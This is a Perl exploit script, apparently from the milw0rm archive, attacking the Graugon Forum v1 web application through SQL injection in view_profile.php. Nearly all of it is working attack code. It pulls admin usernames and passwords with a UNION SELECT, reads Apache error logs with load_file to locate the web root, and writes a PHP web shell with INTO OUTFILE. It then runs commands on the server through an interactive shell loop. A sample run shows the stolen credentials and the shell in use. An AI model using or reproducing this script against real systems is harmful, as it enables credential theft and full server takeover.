#!/usr/bin/perl

# |--------------------------------------------------------------------------------------------------------------------------------------------|
# |                     INFORMATIONS                                                                                                           |
# |--------------------------------------------------------------------------------------------------------------------------------------------|
# |Web Application :   Graugon Forum v1                                                                                                        |
# |Download        :   http://www.graugon.com/forum/forum.zip                                                                                  |
# |--------------------------------------------------------------------------------------------------------------------------------------------|
# |Remote SQL Command Injection Exploit                                                                                                        |
# |by Osirys                                                                                                                                   |
# |osirys[at]autistici[dot]org                                                                                                                 |
# |osirys.org                                                                                                                                  |
# |Greets to: evilsocket, Fireshot, Todd and str0ke                                                                                            |
# |Thank you: milw0rm.com / packetstormsecurity.org / evilsocket.net                                                                           |
# |--------------------------------------------------------------------------------------------------------------------------------------------|
# |BUG [Sql Injection]
# |  p0c : /[path]/view_profile.php?id=[sql_string]
# |SQL Injections used by this sploit :
# |[1] /path]/view_profile.php?id=osirys' union all select concat(details),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19 from admins_lf2713 order by '*
# |[2] /path]/view_profile.php?id=osirys' union all select load_file('file'),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19 order by '*
# |[3] /path]/view_profile.php?id=osirys' union all select 'rce',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19 into outfile 'file
# |--------------------------------------------------------------------------------------------------------------------------------------------|

#----------------------------------------------------------------------------------------------------------------------------------------------|
# Exploit in action [>!]
#----------------------------------------------------------------------------------------------------------------------------------------------|
# osirys[~]>$ perl graugon_forum.txt http://localhost/forum/
#
#   ---------------------------
#          Graugon Forum
#       Command Inj Exploit
#           by Osirys
#   ---------------------------
#
# [*] Getting admin login details ..
# [$] User: admin
# [$] Pass: password
# [*] Generating error through GET request ..
# [*] Cheeking Apache Error Log path ..
# [*] Error Log path found -> /var/log/httpd/error_log
# [*] Website path found -> /home/osirys/web/forum/
# [*] Shell succesfully injected !
# [&] Hi my master, do your job now [!]
#
# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/forum
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>$
#----------------------------------------------------------------------------------------------------------------------------------------------|

use IO::Socket;
use LWP::UserAgent;

my $host = $ARGV[0];
my $rand = int(rand 9) +1;

my @error_logs  =  qw(
                      /var/log/httpd/error.log
                      /var/log/httpd/error_log
                      /var/log/apache/error.log
                      /var/log/apache/error_log
                      /var/log/apache2/error.log
                      /var/log/apache2/error_log
                      /logs/error.log
                      /var/log/apache/error_log
                      /var/log/apache/error.log
                      /usr/local/apache/logs/error_log
                      /etc/httpd/logs/error_log
                      /etc/httpd/logs/error.log
                      /var/www/logs/error_log
                      /var/www/logs/error.log
                      /usr/local/apache/logs/error.log
                      /var/log/error_log
                      /apache/logs/error.log
                    );

my $php_c0de   =  "<?php echo \"st4rt\";if(get_magic_quotes_gpc()){ \$_GET".
                  "[cmd]=stripslashes(\$_GET[cmd]);}system(\$_GET[cmd]);?>";

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

print "[*] Getting admin login details ..\n";

my $url = $host."/view_profile.php?id=osirys' union all select concat(0x64657461696C73,username,0x3a,password,0x64657461696C73),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19 from admins_lf2713 order by '*";
my $re = get_req($url);
if ($re =~ /details(.+):(.+)details/) {
    $user = $1;
    $pass = $2;
    print "[\$] User: $user\n";
    print "[\$] Pass: $pass\n";
}
else {
    print "[-] Can't extract admin details\n\n";
}

print "[*] Generating error through GET request ..\n";

get_req($host."/osirys_log_test".$rand);

print "[*] Cheeking Apache Error Log path ..\n";

while (($log = <@error_logs>)&&($gotcha != 1)) {
    $tmp_path = $host."/view_profile.php?id=osirys' union all select load_file('".$log."'),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19 order by '*";
    $re = get_req($tmp_path);
    if ($re =~ /File does not exist: (.+)\/osirys_log_test$rand/) {
        $site_path = $1."/";
        $gotcha = 1;
        print "[*] Error Log path found -> $log\n";
        print "[*] Website path found -> $site_path\n";
        &inj_shell;
    }
}

$gotcha == 1 || die "[-] Couldn't file error_log !\n";

sub inj_shell {
    my $attack  = $host."/view_profile.php?id=osirys' union all select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,'".$php_c0de."',19 into outfile '".$site_path."/1337.php";
    get_req($attack);
    my $test = get_req($host."/1337.php");
    if ($test =~ /st4rt/) {
        print "[*] Shell succesfully injected !\n";
        print "[&] Hi my master, do your job now [!]\n\n";
        $exec_path = $host."/shell.php";
        &exec_cmd;

    }
    else {
        print "[-] Shell not found \n[-] Exploit failed\n\n";
        exit(0);
    }
}

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = $host."/1337.php?cmd=".$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ /st4rt(.+)\*\*19/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  ---------------------------\n".
          "         Graugon Forum       \n".
          "      Command Inj Exploit    \n".
          "          by Osirys          \n".
          "  ---------------------------\n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input data failed ! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

# milw0rm.com [2009-02-20]